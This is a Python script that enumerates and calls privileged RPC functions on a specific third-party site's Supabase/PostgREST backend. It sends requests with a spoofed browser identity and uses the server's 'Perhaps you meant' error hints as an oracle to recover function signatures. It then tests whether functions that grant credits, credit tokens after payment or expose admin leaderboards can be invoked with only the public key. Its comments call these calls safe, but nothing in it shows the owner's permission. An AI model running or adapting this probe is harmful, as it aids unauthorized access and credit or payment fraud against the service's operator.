#!/usr/bin/env python3
# RPC signature discovery via PGRST202 hint oracle + safe callability tests with nonexistent UUIDs.
import json, re, sys, time, urllib.request, urllib.error, urllib.parse
sys.stdout.reconfigure(encoding="utf-8")
BASE = "https://cdn.onlyfakeai.ru"
PK = "<publishable-key>"
H = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.9",
     "Origin": "https://onlyfakeai.ru", "Referer": "https://onlyfakeai.ru/", "apikey": PK}
NIL = "00000000-0000-0000-0000-000000000000"

def call(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    h = dict(H); h["Content-Type"] = "application/json"
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=20) as resp:
            return resp.status, resp.read(3000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(3000).decode("utf-8", "replace")
    except Exception as e:
        return "ERR", repr(e)

def hints(txt):
    return re.findall(r"Perhaps you meant to call the function public\.([A-Za-z0-9_]+\([^)]*\))", txt)

# candidate argument vectors (name -> sample value). Every call adds zz_probe=1 so a full match cannot execute.
vectors = {
 "grant_plan_credits": [
    [("p_user_id", NIL), ("p_plan", "free")],
    [("p_user_id", NIL), ("p_plan", "free"), ("p_credits", 0)],
    [("p_user_id", NIL), ("p_credits", 0)],
    [("user_id", NIL), ("plan", "free")],
    [("user_id", NIL), ("plan", "free"), ("credits", 0)],
    [("target_user_id", NIL), ("plan", "free")],
    [("p_target_user_id", NIL), ("p_plan", "free")],
    [("p_user_id", NIL), ("p_plan_name", "free")],
    [("p_user_id", NIL), ("p_plan", "free"), ("p_generations", 0)],
    [("p_user_id", NIL), ("p_plan", "free"), ("p_amount", 0)],
 ],
 "deduct_credits": [
    [("p_user_id", NIL), ("p_amount", 0)], [("p_user_id", NIL), ("p_credits", 0)],
    [("user_id", NIL), ("amount", 0)], [("p_user_id", NIL)], [("p_amount", 0)],
 ],
 "deduct_generation": [
    [("p_user_id", NIL)], [("user_id", NIL)],
 ],
 "credit_tokens_after_payment": [
    [("p_user_id", NIL), ("p_amount", 0)], [("p_user_id", NIL), ("p_tokens", 0)],
    [("p_payment_id", NIL), ("p_user_id", NIL)], [("p_user_id", NIL)], [("p_payment_id", NIL)],
    [("user_id", NIL), ("amount", 0)], [("p_user_id", NIL), ("p_credits", 0)],
 ],
 "remove_watermark_and_deduct_token": [
    [("p_user_id", NIL), ("p_job_id", NIL)], [("p_job_id", NIL)], [("p_user_id", NIL)],
    [("user_id", NIL), ("job_id", NIL)], [("p_job_id", "1")],
 ],
 "get_jobs_time_series": [
    [("date_trunc_type", "day"), ("start_date", "2026-01-01"), ("end_date", "2026-02-01")],
    [("date_trunc_type", "day"), ("p_start_date", "2026-01-01"), ("p_end_date", "2026-02-01")],
    [("p_date_trunc_type", "day"), ("p_start_date", "2026-01-01"), ("p_end_date", "2026-02-01")],
    [("date_trunc_type", "day")],
 ],
 "get_profiles_time_series": [
    [("date_trunc_type", "day"), ("start_date", "2026-01-01"), ("end_date", "2026-02-01")],
    [("p_date_trunc_type", "day"), ("p_start_date", "2026-01-01"), ("p_end_date", "2026-02-01")],
    [("date_trunc_type", "day")],
 ],
 "get_admin_credit_leaderboard": [
    [("p_limit", 100)], [("limit", 100)], [("p_start_date", "2026-01-01")], [("p_days", 30)],
 ],
}
found = {}
for fn, vecs in vectors.items():
    print(f"\n== {fn} ==")
    for vec in vecs:
        q = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in vec)
        st, txt = call("GET", f"/rest/v1/rpc/{fn}?{q}&zz_probe=1")
        hh = hints(txt)
        if hh:
            print(f"  args={[k for k,_ in vec]} -> status {st} HINT {hh}")
            found[fn] = hh
        else:
            print(f"  args={[k for k,_ in vec]} -> status {st} {txt[:130]}")
        time.sleep(0.4)

print("\n=== SAFE callability tests (nonexistent UUIDs only; cannot modify real rows) ===")
tests = [
 ("grant_plan_credits", {"p_user_id": NIL, "p_plan": "free"}),
 ("grant_plan_credits", {"p_user_id": NIL, "p_plan": "free", "p_credits": 0}),
 ("deduct_generation", {"p_user_id": NIL}),
 ("deduct_credits", {"p_user_id": NIL, "p_amount": 0}),
 ("deduct_credits", {"p_user_id": NIL, "p_credits": 0}),
 ("credit_tokens_after_payment", {"p_user_id": NIL, "p_amount": 0}),
 ("remove_watermark_and_deduct_token", {"p_job_id": "9999999999999"}),
 ("get_jobs_time_series", {"date_trunc_type": "day", "start_date": "2026-01-01", "end_date": "2026-02-01"}),
 ("get_profiles_time_series", {"date_trunc_type": "day", "start_date": "2026-01-01", "end_date": "2026-02-01"}),
 ("get_admin_credit_leaderboard", {"p_limit": 100}),
]
for fn, args in tests:
    st, txt = call("POST", f"/rest/v1/rpc/{fn}", body=args)
    print(f"  {fn} {list(args)} -> {st} :: {txt[:400]}")
    time.sleep(0.5)
json.dump(found, open("probe_rpc_sig.json", "w"), indent=1)
print("\ndone")
